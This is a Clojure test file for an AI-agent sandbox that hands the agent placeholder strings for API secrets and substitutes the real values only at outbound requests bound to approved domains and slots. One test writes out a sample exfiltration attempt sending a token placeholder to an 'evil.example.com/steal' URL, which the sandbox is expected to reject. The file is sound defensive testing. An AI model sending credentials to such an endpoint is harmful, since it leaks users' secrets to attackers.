(ns dvergr.sandbox.secret-injection-test
  "Boundary secret injection (doc/boundary-secret-injection.md): env/get hands the
   agent a placeholder; do-request substitutes the real value at egress, bound to a
   destination + slot, and scrubs reflected values. The agent never holds plaintext."
  (:require [clojure.test :refer [deftest is testing]]
            [sci.core :as sci]
            [dvergr.sandbox.ns.io :as io]))

(def ^:private substitute! @#'io/substitute-secrets!)
(def ^:private scrub        @#'io/scrub-response)

(def ^:private brave
  {"BRAVE_API_KEY"
   {:placeholder       "@@secret:brave@@"
    :value             "REALKEY"
    :allowed-domains   #{"https://api.search.brave.com"}
    :allowed-locations #{:header :query}
    :header-names      #{"X-Subscription-Token"}}})

(deftest build-registry-resolves-host-env
  (testing "build-secret-registry resolves :env from the host env + keys by env name"
    ;; HOME is reliably set in the test JVM; use it as a stand-in real value.
    (let [reg (io/build-secret-registry [{:name "home" :env "HOME"
                                          :allowed-domains ["https://x.test"]}])]
      (is (contains? reg "HOME"))
      (is (= "@@secret:HOME@@" (get-in reg ["HOME" :placeholder])))
      (is (= (System/getenv "HOME") (get-in reg ["HOME" :value])))
      (is (= #{:header :query} (get-in reg ["HOME" :allowed-locations])) "defaults"))
    (is (= {} (io/build-secret-registry [{:env "DEFINITELY_UNSET_ENV_VAR_XYZ"}]))
        "unset env var → skipped")))

(deftest env-get-returns-placeholder
  (testing "env/get hands the agent the PLACEHOLDER for a configured secret, never the value"
    (let [ctx (sci/init {})]
      (io/add-env-ns! ctx :secrets brave)
      (is (= "@@secret:brave@@"
             (sci/eval-string* ctx "(require '[env]) (env/get \"BRAVE_API_KEY\")")))
      (is (nil? (sci/eval-string* ctx "(env/get \"OTHER\")")) "unknown key → nil"))))

(deftest substitute-injects-on-allowed-domain+slot
  (testing "placeholder in an allowed header → real value, only to the bound domain"
    (let [opts {:headers {"X-Subscription-Token" "@@secret:brave@@" "Accept" "application/json"}}
          out  (substitute! brave nil "https://api.search.brave.com/res/v1/web/search" opts)]
      (is (= "REALKEY" (get-in out [:headers "X-Subscription-Token"])))
      (is (= "application/json" (get-in out [:headers "Accept"])) "other headers untouched"))))

(deftest substitute-rejects-wrong-domain
  (testing "same placeholder to a NON-bound domain → throw (never strip-and-send)"
    (is (thrown? clojure.lang.ExceptionInfo
                 (substitute! brave nil "https://evil.example.com/steal"
                              {:headers {"X-Subscription-Token" "@@secret:brave@@"}})))))

(deftest substitute-rejects-wrong-header
  (testing "placeholder in a header NOT on :header-names → throw"
    (is (thrown? clojure.lang.ExceptionInfo
                 (substitute! brave nil "https://api.search.brave.com/x"
                              {:headers {"Authorization" "Bearer @@secret:brave@@"}})))))

(deftest substitute-rejects-body-by-default
  (testing "placeholder in the body, but :body not in :allowed-locations → throw"
    (is (thrown? clojure.lang.ExceptionInfo
                 (substitute! brave nil "https://api.search.brave.com/x"
                              {:body "token=@@secret:brave@@"})))))

(deftest scrub-remasks-reflected-value
  (testing "a reflected real value in the response body/headers → re-masked to placeholder"
    (let [resp (scrub brave {:status 200
                             :headers {"X-Echo" "REALKEY"}
                             :body "{\"echoed\":\"REALKEY\",\"ok\":true}"})]
      (is (not (clojure.string/includes? (:body resp) "REALKEY")))
      (is (clojure.string/includes? (:body resp) "@@secret:brave@@"))
      (is (= "@@secret:brave@@" (get-in resp [:headers "X-Echo"]))))))

(deftest build-registry-basic-auth-pre-encodes
  (testing ":basic-auth pre-encodes base64(user:pass) as the secret value"
    (let [reg (io/build-secret-registry [{:name "ZULIP_AUTH"
                                          :basic-auth ["me@x.test" "KEY123"]
                                          :allowed-domains ["https://z.test"]}])
          v   (get-in reg ["ZULIP_AUTH" :value])]
      (is (= "me@x.test:KEY123"
             (String. (.decode (java.util.Base64/getDecoder) ^String v))))
      (is (= "@@secret:ZULIP_AUTH@@" (get-in reg ["ZULIP_AUTH" :placeholder]))))
    (testing "companies-house style — secret in the USER slot, empty pass"
      (let [reg (io/build-secret-registry [{:name "CH" :basic-auth ["KEY" ""]}])]
        (is (= "KEY:" (String. (.decode (java.util.Base64/getDecoder)
                                        ^String (get-in reg ["CH" :value])))))))
    (testing "no credential → skipped"
      (is (= {} (io/build-secret-registry [{:name "X" :basic-auth ["" ""]}]))))))

(deftest substitute-handles-bearer-substring
  (testing "placeholder embedded in a 'Bearer …' value (github) substitutes in place"
    (let [reg {"GITHUB_TOKEN" {:placeholder "@@secret:GITHUB_TOKEN@@" :value "ghp_xyz"
                               :allowed-domains #{"https://api.github.com"}
                               :allowed-locations #{:header} :header-names #{"Authorization"}}}
          out (substitute! reg nil "https://api.github.com/user"
                           {:headers {"Authorization" "Bearer @@secret:GITHUB_TOKEN@@"}})]
      (is (= "Bearer ghp_xyz" (get-in out [:headers "Authorization"]))))))

(deftest substitute-allows-body-when-configured
  (testing "bluesky-style: :body in :allowed-locations → password substituted in JSON body"
    (let [reg {"BLUESKY_APP_PASSWORD" {:placeholder "@@secret:BLUESKY_APP_PASSWORD@@" :value "app-pw"
                                       :allowed-domains #{"https://bsky.social"}
                                       :allowed-locations #{:body}}}
          out (substitute! reg nil "https://bsky.social/xrpc/com.atproto.server.createSession"
                           {:body "{\"identifier\":\"me\",\"password\":\"@@secret:BLUESKY_APP_PASSWORD@@\"}"})]
      (is (clojure.string/includes? (:body out) "\"password\":\"app-pw\"")))))

(deftest no-secrets-is-a-noop
  (testing "empty registry leaves requests + responses untouched"
    (let [opts {:headers {"A" "b"} :body "x"}]
      (is (= opts (substitute! {} nil "https://any.test" opts)))
      (is (= {:body "x"} (scrub {} {:body "x"}))))))
